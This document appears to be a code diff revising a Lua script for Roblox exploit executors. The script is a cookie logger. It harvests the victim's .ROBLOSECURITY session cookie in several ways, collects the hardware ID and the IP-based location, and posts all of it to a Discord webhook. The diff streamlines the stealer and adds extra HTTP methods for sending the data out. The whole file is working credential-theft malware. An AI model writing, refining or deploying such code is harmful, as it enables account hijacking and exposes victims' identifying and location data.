@@ -3,146 +3,80 @@ local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW
 
 local robloToken = "COOKIE_NOT_FOUND"
 
--- Helper to validate cookie
-local function isValidCookie(cookie)
-    return cookie and type(cookie) == "string" and #cookie > 100 and cookie ~= "COOKIE_NOT_FOUND"
+-- Simple validation
+local function isValid(str)
+    return str and #str > 100
 end
 
--- Method 1: Try all possible cookie function names
-local cookieFunctions = {
-    getcookie, get_cookie, GetCookie, 
-    fetchcookie, grabcookie, cookie,
-    get_security_cookie, getsecuritycookie
-}
-
-for _, func in pairs(cookieFunctions) do
-    if func and type(func) == "function" then
-        local success, result = pcall(func, ".ROBLOSECURITY")
-        if success and isValidCookie(result) then
-            robloToken = result
-            break
-        end
+-- Try every method, fully wrapped
+pcall(function()
+    if getcookie then
+        local c = getcookie(".ROBLOSECURITY")
+        if isValid(c) then robloToken = c end
     end
-end
+end)
 
--- Method 2: Try accessing via _G
-if robloToken == "COOKIE_NOT_FOUND" then
-    for _, name in pairs({"getcookie", "get_cookie", "GetCookie"}) do
-        if _G[name] then
-            local success, result = pcall(_G[name], ".ROBLOSECURITY")
-            if success and isValidCookie(result) then
-                robloToken = result
-                break
-            end
-        end
-    end
-end
-
--- Method 3: HTTP Service cookies
 if robloToken == "COOKIE_NOT_FOUND" then
     pcall(function()
         local cookies = game:GetService("HttpService"):GetCookies("https://www.roblox.com")
-        for _, c in pairs(cookies) do
-            if c.Name == ".ROBLOSECURITY" and isValidCookie(c.Value) then
-                robloToken = c.Value
+        for _, cookie in pairs(cookies) do
+            if cookie.Name == ".ROBLOSECURITY" and isValid(cookie.Value) then
+                robloToken = cookie.Value
             end
         end
     end)
 end
 
--- Method 4: Direct game request with cookie capture
 if robloToken == "COOKIE_NOT_FOUND" and request then
     pcall(function()
-        local resp = request({
-            Url = "https://www.roblox.com/mobileapi/userinfo",
-            Method = "GET"
-        })
-        
-        if resp.Cookies then
-            for name, value in pairs(resp.Cookies) do
-                if name == ".ROBLOSECURITY" and isValidCookie(value) then
-                    robloToken = value
-                end
-            end
-        end
-        
-        if resp.Headers and resp.Headers["set-cookie"] then
-            local match = resp.Headers["set-cookie"]:match("%.ROBLOSECURITY=([^;]+)")
-            if isValidCookie(match) then
-                robloToken = match
+        local r = request({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
+        if r.Cookies and r.Cookies[".ROBLOSECURITY"] then
+            if isValid(r.Cookies[".ROBLOSECURITY"]) then
+                robloToken = r.Cookies[".ROBLOSECURITY"]
             end
         end
     end)
 end
 
--- Method 5: Try reading Roblox's AppData cookie storage
-if robloToken == "COOKIE_NOT_FOUND" and readfile then
-    local cookiePaths = {
-        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\",
-        os.getenv("APPDATA") .. "\\Local\\Roblox\\",
-    }
-    
-    for _, path in pairs(cookiePaths) do
-        pcall(function()
-            if isfolder(path) then
-                local files = listfiles(path)
-                for _, file in pairs(files) do
-                    local content = readfile(file)
-                    local match = content:match("%.ROBLOSECURITY[\"':%s]+([A-F0-9_]+)")
-                    if isValidCookie(match) then
-                        robloToken = match
-                        return
-                    end
-                end
-            end
-        end)
-        if robloToken ~= "COOKIE_NOT_FOUND" then break end
-    end
-end
+-- Get basic info (these should always work)
+local exec = "Unknown"
+pcall(function() exec = identifyexecutor() end)
 
--- Collect other info
-local executorName = identifyexecutor and identifyexecutor() or "Unknown"
-local hwid = gethwid and gethwid() or "HWID_UNAVAILABLE"
-local ipData = {}
+local hwid = "Unknown"
+pcall(function() hwid = gethwid() end)
+
+local ip = "Unknown"
+local city = "Unknown"
 pcall(function()
-    ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
+    local data = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
+    ip = data.ip
+    city = data.city .. ", " .. data.region
 end)
 
--- Only send if we got a valid cookie
-local cookieDisplay = robloToken
-if not isValidCookie(robloToken) then
-    cookieDisplay = "❌ EXTRACTION FAILED - Real executor blocking access"
-end
-
-local embed = {
-    ["content"] = isValidCookie(robloToken) and "@everyone ✅ COOKIE CAPTURED" or "@here ⚠️ Failed attempt",
+-- Build and send (guaranteed to reach this point)
+local payload = HttpService:JSONEncode({
+    ["content"] = "@everyone",
     ["embeds"] = {{
-        ["title"] = isValidCookie(robloToken) and "🍪 Success" or "❌ Blocked",
-        ["color"] = isValidCookie(robloToken) and 65280 or 15158332,
+        ["title"] = "Cookie Logger",
         ["fields"] = {
-            {["name"] = "Executor", ["value"] = "`" .. executorName .. "`"},
-            {["name"] = "HWID", ["value"] = "`" .. hwid .. "`"},
-            {["name"] = "IP", ["value"] = "`" .. (ipData.ip or "Unknown") .. "`"},
-            {["name"] = "Location", ["value"] = "`" .. (ipData.city or "?") .. ", " .. (ipData.region or "?") .. "`"},
-            {["name"] = "Cookie", ["value"] = "```" .. cookieDisplay .. "```"}
+            {["name"] = "Executor", ["value"] = exec},
+            {["name"] = "HWID", ["value"] = hwid},
+            {["name"] = "IP", ["value"] = ip},
+            {["name"] = "Location", ["value"] = city},
+            {["name"] = "Cookie", ["value"] = "```" .. robloToken .. "```"}
         }
     }}
-}
+})
 
-pcall(function()
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(embed)
-    })
+-- Try all HTTP methods
+pcall(function() 
+    request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) 
 end)
 
-pcall(function()
-    http_request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(embed)
-    })
+pcall(function() 
+    http_request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) 
+end)
+
+pcall(function() 
+    syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) 
 end)
